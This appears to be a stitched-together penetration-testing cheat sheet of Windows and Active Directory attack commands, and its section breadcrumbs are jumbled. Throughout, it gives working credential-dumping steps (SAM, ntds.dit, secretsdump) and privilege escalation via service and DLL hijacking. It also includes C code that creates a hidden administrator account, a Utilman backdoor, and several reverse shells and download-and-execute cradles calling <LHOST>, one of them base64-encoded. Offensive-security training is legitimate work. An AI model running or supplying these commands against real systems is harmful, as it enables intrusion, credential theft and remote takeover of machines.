> [https://www.nirsoft.net/utils/credentials\_file\_view.html](https://www.nirsoft.net/utils/credentials_file_view.html)

```
cmdkey /list
rundll32 keymgr.dll, KRShowKeyMgr
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query HKEY_CURRENT_USER\Software\<USERNAME>\PuTTY\Sessions\ /f "Proxy" /s
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
```
findstr /si password *.xml *.ini *.txt
dir .s *pass* == *.config
dir /s *pass* == *cred* == *vnc* == *.config*
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\<USERNAME>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.vbs -File -Recurse -ErrorAction SilentlyContinue
```


## PowerShell History

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > Credential Harvesting > PowerShell History`

```
Get-History
(Get-PSReadlineOption).HistorySavePath
type C:\Users\%username%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
```
cmdkey /list
runas /savecred /user:<USERNAME> cmd.exe
```


## Winlogon Credentials

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > Credential Harvesting > Winlogon Credentials`

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```
```
Get-ADComputer <RHOST> -property 'ms-mcs-admpwd'
```
```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```


## Dumping Credentials

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > Credential Harvesting > Dumping Credentials`

```
reg save hklm\system system
reg save hklm\sam sam
reg.exe save hklm\sam c:\temp\sam.save
reg.exe save hklm\security c:\temp\security.save
reg.exe save hklm\system c:\temp\system.save
```
```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
```
C:\Windows\System32\inetsrv>appcmd.exe list apppool /@:*
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```


## PuTTY

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > Credential Harvesting > PuTTY`

```
reg query HKEY_CURRENT_USER\Software\<USERNAME>\PuTTY\Sessions\ /f "Proxy" /s
```
```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```


## Enable WinRM

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > Enable WinRM`

```
winrm quickconfig
```
```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=yes
```

or

```
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0;
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1;
Enable-NetFirewallRule -DisplayGroup "Remote Desktop";
```


## AlwaysInstallElevated

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > Enable WinRM > AlwaysInstallElevated`

```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=<LHOST> lport=<LPORT> -f msi > <FILE>.msi
```
```
msiexec /quiet /qn /i <FILE>.msi
```
```
reg save hklm\system C:\Users\<USERNAME>\system.hive
reg save hklm\sam C:\Users\<USERNAME>\sam.hive
```


## Dumping Hashes

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > Enable WinRM > Dumping Hashes`

```
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```
```
pypykatz registry --sam sam.hive system.hive
```

> [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)

```
SET CONTEXT PERSISTENT NOWRITERSp
add volume c: alias foobarp
createp
expose %foobar% z:p
```
```
diskshadow /s <FILE>.txt
```


## Copy ntds.dit

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > Enable WinRM > Copy ntds.dit`

```
Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit
```
```
reg save HKLM\SYSTEM c:\temp\system
```
```
impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```
```
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system
```
```
set metadata C:\Windows\temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```
```
diskshadow /s script.txt
robocopy /b E:\Windows\ntds . ntds.dit
```
```
impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
```


## SeLoadDriverPrivilege

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > Enable WinRM > SeLoadDriverPrivilege`

```
sc.exe query
$services=(get-service).name | foreach {(Get-ServiceAcl $_)  | where {$_.access.IdentityReference -match 'Server Operators'}}
```
```
sc.exe config VSS binpath="C:\temp\nc64.exe -e cmd <LHOST> <LPORT>"
sc.exe stop VSS
sc.exe start VSS
```


## SeManageVolumePrivilege

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > Enable WinRM > SeManageVolumePrivilege`

> [https://github.com/CsEnox/SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit)

```
.\SeManageVolumeExploit
```
1. Generate a custom DLL and locate it at `C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll`.
2. Initiate the `PrintNotify` object by executing the following PowerShell commands:
```
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
```
```
$object = [Activator]::CreateInstance($type)
```
1. Attain a system shell access.


## SeTakeOwnershipPrivilege

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > Enable WinRM > SeTakeOwnershipPrivilege`

```
takeown /f C:\Windows\System32\Utilman.exe
```
```
icacls C:\Windows\System32\Utilman.exe /grant Everyone:F
```
```
C:\Windows\System32\> copy cmd.exe utilman.exe
```

Click the `Ease of Access` button on the logon screen to get a shell with `NT Authority\System` privileges.

> [https://github.com/antonioCoco/RogueWinRM](https://github.com/antonioCoco/RogueWinRM)

```
.\RogueWinRM.exe -p "C:\> .\nc64.exe" -a "-e cmd.exe <LHOST> <LPORT>"
```


## DLL Hijacking

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > DLL Hijacking`

https://hijacklibs.net/

1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory.
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls .\PATH\TO\BINARY\<BINARY>.exe
Restart-Service <SERVICE>
$env:path
```


## customdll.cpp

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > DLL Hijacking > customdll.cpp`

```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
        i = system ("net user <USERNAME> <PASSWORD> /add");
        i = system ("net localgroup administrators <USERNAME> /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```


## Compiling customdll.cpp

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > DLL Hijacking > Compiling customdll.cpp`

Copy the `.dll` file to the desired path.

```
Restart-Service <SERVICE>
Get-LocalGroupMember administrators
```
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
```
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<SERVICE>'}
```


## Permission Table

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > DLL Hijacking > Permission Table`

| Mask | Permissions |
| --- | --- |
| F | Full access |
| M | Modify access |
| RX | Read and execute access |
| R | Read-only access |
| W | Write-only access |


## impacket-addcomputer - GenericAll (PrivEsc)

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > DonPAPI > impacket-addcomputer - GenericAll (PrivEsc)`

```shell
impacket-addcomputer resourced.local/L.Livingstone -dc-ip 192.168.175.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'

# Full Attack Chain
# verify added from winrm
get-adcomputer attack

# Manage delegation of new computer
rbcd.py -delegate-to RESOURCEDC$ -delegate-from ATTACK$ -dc-ip 192.168.175.175 -action 'write' -hashes ':19a3a7550ce8c505c2d46b5e39d6f808' resourced.local/L.Livingstone

# Confirm again in winrm # May not show... continue on
Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-

# Get Administrator Service ticket with privileged machine
impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.175.175

# With this saved Ticket export a new environment variable named `KRB5CCNAME` with the location of this file
export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
# Export must be done in the same terminal window
sudo sh -c 'echo "192.168.175.175 resourcedc.resourced.local" >> /etc/hosts'

# psexec with Ticker to get SYSTEM
sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.175.175
```


## adduser.c

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > DLL Hijacking > adduser.c`

```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user <USERNAME> <PASSWORD> /add");
  i = system ("net localgroup administrators <USERNAME> /add");
  
  return 0;
}
```


## Compiling

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > DLL Hijacking > Compiling`

```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```


## Execution

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > DLL Hijacking > Execution`

```
net stop <SERVICE>
net start <SERVICE>
```

or

```
shutdown /r /t 0
Get-LocalGroupMember administrators
```


## PowerView Example

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > DLL Hijacking > PowerView Example`

```
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile
Install-ServiceBinary -Name '<SERVICE>'
```
```
$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe' | Get-ModifiablePath -Literal
$ModifiableFiles
$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe argument' | Get-ModifiablePath -Literal
$ModifiableFiles
$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe argument -conf=C:\temp\path' | Get-ModifiablePath -Literal
$ModifiableFiles
```


## Search Order

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > DLL Hijacking > Search Order`

```
C:\example.exe
C:\Program Files\example.exe
C:\Program Files\my example\example.exe
C:\Program Files\my example\my example\example.exe
```

Place a `.exe` file in the desired folder, then `start` or `restart` the `service`.

```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
Start-Service <SERVICE>
Stop-Service <SERVICE>
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\my example"
Start-Service <SERVICE>
Get-LocalGroupMember administrators
```


## PowerView Example

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > DLL Hijacking > PowerView Example`

```
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
Write-ServiceBinary -Name '<SERVICE>' -Path "C:\Program Files\my example\example.exe"
Start-Service <SERVICE>
Get-LocalGroupMember administrators
```

Place a `.exe` file in the desired folder and wait for the `scheduled task` to get `executed`.

```
schtasks /query /fo LIST /v
icacls C:\PATH\TO\BINARY\<BINARY>.exe
Get-LocalGroupMember administrators
```


## PassTheCert

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > PassTheCert`

> [https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)

> [https://github.com/AlmondOffSec/PassTheCert/tree/main/Python](https://github.com/AlmondOffSec/PassTheCert/tree/main/Python)

```
certipy-ad cert -pfx <CERTIFICATE>.pfx -nokey -out <CERTIFICATE>.crt
certipy-ad cert -pfx <CERTIFICATE>.pfx -nocert -out <CERTIFICATE>.key
python3 passthecert.py -domain '<DOMAIN>' -dc-host '<DOMAIN>' -action 'modify_user' -target '<USERNAME>' -new-pass '<PASSWORD>' -crt ./<CERTIFICATE>.crt -key ./<CERTIFICATE>.key
evil-winrm -i '<RHOST>' -u '<USERNAME>' -p '<PASSWORD>'
```


## Penelope

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Penelope`

```
┍┽ penelope ┾┑ > run peass_ng                                     // Run the latest version of PEASS-ng in the background 
┍┽ penelope ┾┑ > run lse                                     // Run the latest version of linux-smart-enumeration in the background
┍┽ penelope ┾┑ > run meterpreter                                 // Get a meterpreter shell
┍┽ penelope ┾┑ > download /etc                                     // Download the remote /etc folder 
┍┽ penelope ┾┑ > upload https://www.exploit-db.com/exploits/40847    // Upload an exploit to the remote machine
┍┽ penelope ┾┑ > upload <FOLDER>                         // Upload a local folder to the remote machine
```


## PKINITtools

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > PKINITtools`

```
python3 gettgtpkinit.py -cert-pfx <USERNAME>.pfx -dc-ip <RHOST> <DOMAIN>/<USERNAME> <USERNAME>.ccache
export KRB5CCNAME=<USERNAME>.ccache
python3 getnthash.py <DOMAIN>/<USERNAME> -key 6617cde50b7ee63faeb6790e84981c746efa66f68a1cc3a394bbd27dceaf0554
```

> [https://takraw-s.medium.com/fix-errors-socket-ssl-wrapping-error-errno-104-connection-reset-by-peer-9c63c551cd7](https://takraw-s.medium.com/fix-errors-socket-ssl-wrapping-error-errno-104-connection-reset-by-peer-9c63c551cd7)

> [fortra/impacket#581](https://github.com/fortra/impacket/issues/581)

```
sudo vi /etc/ssl/openssl.cnf
```

change

```
[system_default_sect]
MinProtocol = TLSv1.2
CipherString = DEFAULT:@SECLEVEL=2
```

to

```
[system_default_sect]
MinProtocol = TLSv1.0
CipherString = DEFAULT:@SECLEVEL=1
```

Alternatively you can create your own `openssl.cnf` and `export` the path to it.

```
$ export OPENSSL_CONF=/PATH/TO/FOLDER/openssl.cnf
```


## Port Scanning

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Port Scanning`

```
for i in $(seq 1 254); do nc -zv -w 1 <XXX.XXX.XXX>.$i <RPORT>; done
```
```
export ip=<RHOST>; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done
```


## powercat

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > powercat`

```
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
```


## Powermad

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Powermad`

```
Import-Module ./Powermad.ps1
$secureString = convertto-securestring "<PASSWORD>" -asplaintext -force
New-MachineAccount -MachineAccount <NAME> -Domain <DOMAIN> -DomainController <DOMAIN> -Password $secureString
```


## Common Commands

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > PowerShell > Common Commands`

```
whoami /all
getuserid
systeminfo
Get-Process
net users
net users <USERNAME>
Get-ADUser -Filter * -SearchBase "DC=<DOMAIN>,DC=<DOMAIN>"
Get-Content <FILE>
Get-ChildItem . -Force
GCI -hidden
type <FILE> | findstr /l <STRING>
[convert]::ToBase64String((Get-Content -path "<FILE>" -Encoding byte))
```
```
Set-ExecutionPolicy remotesigned
Set-ExecutionPolicy unrestricted
```
```
powershell.exe -noprofile -executionpolicy bypass -file .\<FILE>.ps1
```
```
Import-Module .\<FILE>
```
```
Set-ExecutionPolicy Unrestricted
powershell -Command "$PSVersionTable.PSVersion"
powershell -c "[Environment]::Is64BitProcess"
```
```
type C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
```
pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
```
```
Compress-Archive -LiteralPath C:\PATH\TO\FOLDER\<FOLDER> -DestinationPath C:\PATH\TO\FILE<FILE>.zip
```
```
Expand-Archive -Force <FILE>.zip
```
```
Start-Process -FilePath "C:\nc64.exe" -ArgumentList "<LHOST> <LPORT> -e powershell"
```
```
IEX(IWR http://<LHOST>/<FILE>.ps1)
Invoke-Expression (Invoke-WebRequest http://<LHOST/<FILE>.ps1)
```


## .NET Reflection

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > PowerShell > .NET Reflection`

```
$bytes = (Invoke-WebRequest "http://<LHOST>/<FILE>.exe" -UseBasicParsing ).Content
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
$entryPointMethod.Invoke($null, (, [string[]] ('find', '/<COMMAND>')))
```
```
$password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $password)
Enter-PSSession -ComputerName <RHOST> -Credential $cred
```

or

```
$SecurePassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<USERNAME>', $SecurePassword)
$Session = New-PSSession -Credential $Cred
Invoke-Command -Session $session -scriptblock { whoami }
```

or

```
$username = '<USERNAME>'
$password = '<PASSWORD>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process powershell.exe -Credential $credential
```
```
powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
```
```
$PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String <PASSWORD>
New-ADUser -Name "<USERNAME>" -Description "<DESCRIPTION>" -Enabled $true -AccountPassword $PASSWORD
Add-ADGroupMember -Identity "Domain Admins" -Member <USERNAME>
```
```
$pass = ConvertTo-SecureString "<PASSWORD>" -AsPlaintext -Force
$cred = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $pass)
Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -credential $cred -command {whoami}
```
```
$pass = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<USERNAME>", $pass)
Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/<FILE>.ps1') } -Credential $cred
```


## PrivescCheck

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > PrivescCheck`

```
Set-ExecutionPolicy Bypass -Scope Process -Force
. .\PrivescCheck.ps1
```
```
Get-Content .\PrivescCheck.ps1 | Out-String | Invoke-Expression
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML"
```


## pwncat

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > pwncat`

```
(local) pwncat$ back    // get back to shell
Ctrl+d                  // get back to pwncat shell
```
```
pwncat-cs -lp <LPORT>
(local) pwncat$ download /PATH/TO/FILE/<FILE> .
(local) pwncat$ upload /PATH/TO/FILE/<FILE> /PATH/TO/FILE/<FILE>
```


## RunasCs

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > RunasCs`

```

.\RunasCs.exe <USERNAME> <PASSWORD> powershell -r <LHOST>:<LPORT>

.\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT>
.\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT> --bypass-uac
.\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT> --bypass-uac -l 5 -b
.\RunasCs.exe <USERNAME> <PASSWORD> <FILE> --bypass-uac -l 5 -b
.\RunasCs.exe -d <DOMAIN> "<USERNAME>" '<PASSWORD>' cmd.exe -r <LHOST>:<LPORT>
.\RunasCs.exe -l 3 -d <DOMAIN> "<USERNAME>" '<PASSWORD>' 'C:\Users\<USERNAME>\Downloads\<FILE>'
```


## Seatbelt

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Seatbelt`

```
.\Seatbelt.exe -group=system
.\Seatbelt.exe -group=all
.\Seatbelt.exe -group=all -full
```


## Shadow Credentials

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Shadow Credentials`

```
python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<OBJECT>' --action 'list'
```
```
python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<OBJECT>' --action 'info' --device-id <ID>
```
```
python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<OBJECT>' --action 'add' --filename <OBJECT>
```
```
python3 gettgtpkinit.py <DOMAIN>/<USERNAME> -cert-pfx <USERNAME>.pfx -pfx-pass '<PASSWORD>' <USERNAME>.ccache
```
```
export KRB5CCNAME=<USERNAME>.ccache
```
```
python3 getnthash.py <DOMAIN>/<USERNAME> -key <KEY>
```
```
pth-net rpc password '<USERNAME>' '<PASSWORD>' -U '<DOMAIN>'/'<USERNAME>'%'<HASH>':'<HASH>' -S '<RHOST>'
```

or

```
python3 dacledit.py -action 'write' -rights 'FullControl' -principal '<USERNAME>' -target-dn 'CN=<GROUP>,CN=<GROUP>,DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>:<PASSWORD>'
```
```
net rpc group addmem '<GROUP>' '<USERNAME>' -U '<DOMAIN>'/'<USERNAME>'%'<PASSWORD>' -S '<RHOST>'
```
```
bloodyAD --host <RHOST> -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' get object <GROUP> --attr member
```
```
python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<OBJECT>' --action 'list'
```
```
python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<OBJECT>' --action 'info' --device-id <ID>
```
```
python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<OBJECT>' --action 'add' --filename <OBJECT>
```
```
python3 gettgtpkinit.py <DOMAIN>/<USERNAME> -cert-pfx <USERNAME>.pfx -pfx-pass '<PASSWORD>' <USERNAME>.ccache
```
```
export KRB5CCNAME=<USERNAME>.ccache
```
```
python3 getnthash.py <DOMAIN>/<USERNAME> -key <KEY>
```
```
pth-net rpc password '<USERNAME>' '<PASSWORD>' -U '<DOMAIN>'/'<USERNAME>'%'<HASH>':'<HASH>' -S '<RHOST>'
```


## winexe

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > winexe`

```
winexe -U '<USERNAME%PASSWORD>' //<RHOST> cmd.exe
winexe -U '<USERNAME%PASSWORD>' --system //<RHOST> cmd.exe
```


## Payload

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > winexe > Payload`

```
IEX(New-Object System.Net.WebClient).DownloadString("http://<LHOST>/powercat.ps1"); powercat -c <LHOST> -p <LPORT> -e powershell
```

or

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
```

or

```
$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```


## Encoding

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > winexe > Encoding`

> [https://www.base64decode.org/](https://www.base64decode.org/)

Now `Base64 encode` it with `UTF-16LE` and `LF (Unix)`.

```
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANwAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```
```
$ pwsh
